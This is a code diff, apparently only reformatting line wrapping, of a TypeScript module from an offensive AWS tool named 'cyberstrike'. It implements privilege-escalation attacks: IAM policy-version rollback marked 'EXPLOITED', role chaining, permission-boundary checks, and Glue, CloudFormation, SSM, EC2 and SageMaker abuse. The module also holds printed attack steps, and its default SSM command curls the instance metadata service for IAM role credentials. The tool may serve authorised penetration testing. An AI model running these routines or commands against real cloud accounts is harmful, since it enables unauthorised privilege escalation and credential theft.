@@ -107,7 +107,14 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
   if (!policyArn) return { output: "ERROR: --policy-arn required", findings: [] }
 
   const versions = await aws(
-    ["iam", "list-policy-versions", "--policy-arn", policyArn, "--query", "Versions[].[VersionId,IsDefaultVersion,CreateDate]"],
+    [
+      "iam",
+      "list-policy-versions",
+      "--policy-arn",
+      policyArn,
+      "--query",
+      "Versions[].[VersionId,IsDefaultVersion,CreateDate]",
+    ],
     profile,
     region,
     timeout,
@@ -119,12 +126,22 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
   for (const v of vl) output.push(`    ${v[0]} ${v[1] ? "(default)" : ""} — ${v[2]}`)
 
   const nonDefault = vl.filter((v: (string | boolean)[]) => !v[1])
-  if (nonDefault.length === 0) return { output: output.join("\n") + "\n[-] Only one version, nothing to rollback", findings: [] }
+  if (nonDefault.length === 0)
+    return { output: output.join("\n") + "\n[-] Only one version, nothing to rollback", findings: [] }
 
   if (hasFlag(args, "--rollback")) {
     const target = argVal(args, "--version-id") || nonDefault[0][0]
     const doc = await aws(
-      ["iam", "get-policy-version", "--policy-arn", policyArn, "--version-id", target, "--query", "PolicyVersion.Document"],
+      [
+        "iam",
+        "get-policy-version",
+        "--policy-arn",
+        policyArn,
+        "--version-id",
+        target,
+        "--query",
+        "PolicyVersion.Document",
+      ],
       profile,
       region,
       timeout,
@@ -143,16 +160,18 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
       output.push(`\n[+] Default version set to ${target}`)
       return {
         output: output.join("\n"),
-        findings: [{
-          checkId: "AWS-PRIVESC-001",
-          provider: "aws",
-          severity: "critical",
-          status: "EXPLOITED",
-          resource: policyArn,
-          title: `Policy version rolled back: ${policyArn}`,
-          details: `Default version changed to ${target} — may restore broader permissions`,
-          remediation: "Set default to latest restrictive version, delete old permissive versions",
-        }],
+        findings: [
+          {
+            checkId: "AWS-PRIVESC-001",
+            provider: "aws",
+            severity: "critical",
+            status: "EXPLOITED",
+            resource: policyArn,
+            title: `Policy version rolled back: ${policyArn}`,
+            details: `Default version changed to ${target} — may restore broader permissions`,
+            remediation: "Set default to latest restrictive version, delete old permissive versions",
+          },
+        ],
       }
     }
     output.push(`[-] Rollback failed: ${r.stderr.trim()}`)
@@ -169,7 +188,8 @@ export async function roleChain(args: string[], timeout: number): Promise<HookRe
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
 
-  if (roles.length === 0) return { output: "ERROR: Provide role ARNs as positional args for chain: arn1 arn2 arn3", findings: [] }
+  if (roles.length === 0)
+    return { output: "ERROR: Provide role ARNs as positional args for chain: arn1 arn2 arn3", findings: [] }
 
   const output = [`[*] Role chain — ${roles.length} hop(s)\n`]
   const findings: Finding[] = []
@@ -179,14 +199,7 @@ export async function roleChain(args: string[], timeout: number): Promise<HookRe
     const roleArn = roles[i]
     output.push(`[*] Hop ${i + 1}: ${roleArn}`)
 
-    const cmdArgs = [
-      "sts",
-      "assume-role",
-      "--role-arn",
-      roleArn,
-      "--role-session-name",
-      `cyberstrike-hop${i + 1}`,
-    ]
+    const cmdArgs = ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", `cyberstrike-hop${i + 1}`]
 
     let r
     if (currentCreds) {
@@ -354,16 +367,15 @@ export async function gluePrivesc(args: string[], timeout: number): Promise<Hook
   output.push(`    2. glue:CreateJob or glue:CreateDevEndpoint`)
   output.push(`    3. glue:StartJobRun (for job method)`)
   output.push(`\n[*] Create Glue job with:`)
-  output.push(`    aws glue create-job --name cs-privesc --role ${roleArn} --command '{"Name":"pythonshell","ScriptLocation":"${scriptPath}","PythonVersion":"3"}'`)
-  output.push(`\n[*] Or create dev endpoint:`)
-  output.push(`    aws glue create-dev-endpoint --endpoint-name cs-privesc --role-arn ${roleArn} --public-key "ssh-rsa AAAA..."`)
-
-  const jobs = await aws(
-    ["glue", "get-jobs", "--query", "Jobs[].[Name,Role,Command.Name]"],
-    profile,
-    region,
-    timeout,
+  output.push(
+    `    aws glue create-job --name cs-privesc --role ${roleArn} --command '{"Name":"pythonshell","ScriptLocation":"${scriptPath}","PythonVersion":"3"}'`,
   )
+  output.push(`\n[*] Or create dev endpoint:`)
+  output.push(
+    `    aws glue create-dev-endpoint --endpoint-name cs-privesc --role-arn ${roleArn} --public-key "ssh-rsa AAAA..."`,
+  )
+
+  const jobs = await aws(["glue", "get-jobs", "--query", "Jobs[].[Name,Role,Command.Name]"], profile, region, timeout)
   if (jobs.exitCode === 0) {
     const jl = tryJson(jobs.stdout) || []
     output.push(`\n[+] Existing Glue Jobs: ${jl.length}`)
@@ -421,7 +433,14 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
       const sl = tryJson(stacks.stdout)?.StackSummaries || []
       for (const s of sl) {
         const desc = await aws(
-          ["cloudformation", "describe-stacks", "--stack-name", s.StackName, "--query", "Stacks[0].[StackName,RoleARN,Capabilities]"],
+          [
+            "cloudformation",
+            "describe-stacks",
+            "--stack-name",
+            s.StackName,
+            "--query",
+            "Stacks[0].[StackName,RoleARN,Capabilities]",
+          ],
           profile,
           region,
           timeout,
@@ -536,14 +555,20 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
 
 export async function ssmPrivesc(args: string[], timeout: number): Promise<HookResult> {
   const instanceId = argVal(args, "--instance-id")
-  const command = argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  const command =
+    argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const output: string[] = ["[*] SSM Privilege Escalation\n"]
   const findings: Finding[] = []
 
   const instances = await aws(
-    ["ssm", "describe-instance-information", "--query", "InstanceInformationList[].[InstanceId,PlatformType,IPAddress,IamRole]"],
+    [
+      "ssm",
+      "describe-instance-information",
+      "--query",
+      "InstanceInformationList[].[InstanceId,PlatformType,IPAddress,IamRole]",
+    ],
     profile,
     region,
     timeout,
@@ -640,7 +665,12 @@ export async function ec2Privesc(args: string[], timeout: number): Promise<HookR
 
   if (!profileArn) {
     const profiles = await aws(
-      ["iam", "list-instance-profiles", "--query", "InstanceProfiles[].[InstanceProfileName,Arn,Roles[0].RoleName,Roles[0].Arn]"],
+      [
+        "iam",
+        "list-instance-profiles",
+        "--query",
+        "InstanceProfiles[].[InstanceProfileName,Arn,Roles[0].RoleName,Roles[0].Arn]",
+      ],
       profile,
       region,
       timeout,
@@ -681,7 +711,9 @@ export async function ec2Privesc(args: string[], timeout: number): Promise<HookR
 
   output.push(`[*] Would launch EC2 with instance profile: ${profileArn}`)
   output.push(`[*] Steps:`)
-  output.push(`    1. aws ec2 run-instances --image-id <AMI> --instance-type t3.micro --iam-instance-profile Arn=${profileArn}`)
+  output.push(
+    `    1. aws ec2 run-instances --image-id <AMI> --instance-type t3.micro --iam-instance-profile Arn=${profileArn}`,
+  )
   output.push(`    2. Wait for instance to start`)
   output.push(`    3. SSM exec or SSH to instance`)
   output.push(`    4. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`)
@@ -722,7 +754,16 @@ export async function permissionBoundaryBypass(args: string[], timeout: number):
         const versionId = tryJson(doc.stdout)
         if (versionId) {
           const ver = await aws(
-            ["iam", "get-policy-version", "--policy-arn", boundary, "--version-id", versionId, "--query", "PolicyVersion.Document"],
+            [
+              "iam",
+              "get-policy-version",
+              "--policy-arn",
+              boundary,
+              "--version-id",
+              versionId,
+              "--query",
+              "PolicyVersion.Document",
+            ],
             profile,
             region,
             timeout,
@@ -739,7 +780,9 @@ export async function permissionBoundaryBypass(args: string[], timeout: number):
           output.push(`    Allow statements: ${allows.length}`)
           output.push(`    Deny statements: ${denies.length}`)
 
-          const allowedActions = allows.flatMap((s: Record<string, string | string[]>) => Array.isArray(s.Action) ? s.Action : [s.Action]).filter(Boolean)
+          const allowedActions = allows
+            .flatMap((s: Record<string, string | string[]>) => (Array.isArray(s.Action) ? s.Action : [s.Action]))
+            .filter(Boolean)
           if (allowedActions.includes("*") || allowedActions.includes("iam:*")) {
             output.push(`    [!] Boundary allows IAM actions — may be able to modify own boundary`)
             findings.push({
@@ -788,7 +831,12 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
   const findings: Finding[] = []
 
   const notebooks = await aws(
-    ["sagemaker", "list-notebook-instances", "--query", "NotebookInstances[].[NotebookInstanceName,NotebookInstanceStatus,RoleArn,InstanceType]"],
+    [
+      "sagemaker",
+      "list-notebook-instances",
+      "--query",
+      "NotebookInstances[].[NotebookInstanceName,NotebookInstanceStatus,RoleArn,InstanceType]",
+    ],
     profile,
     region,
     timeout,
@@ -814,7 +862,14 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
   }
 
   const trainingJobs = await aws(
-    ["sagemaker", "list-training-jobs", "--max-results", "20", "--query", "TrainingJobSummaries[].[TrainingJobName,TrainingJobStatus]"],
+    [
+      "sagemaker",
+      "list-training-jobs",
+      "--max-results",
+      "20",
+      "--query",
+      "TrainingJobSummaries[].[TrainingJobName,TrainingJobStatus]",
+    ],
     profile,
     region,
     timeout,
@@ -835,7 +890,9 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
 
   output.push(`\n[*] Would create SageMaker notebook with role: ${roleArn}`)
   output.push(`[*] Steps:`)
-  output.push(`    1. aws sagemaker create-notebook-instance --notebook-instance-name cs-privesc --instance-type ml.t2.medium --role-arn ${roleArn}`)
+  output.push(
+    `    1. aws sagemaker create-notebook-instance --notebook-instance-name cs-privesc --instance-type ml.t2.medium --role-arn ${roleArn}`,
+  )
   output.push(`    2. Wait for InService status`)
   output.push(`    3. aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name cs-privesc`)
   output.push(`    4. Open URL, use terminal to access role credentials`)
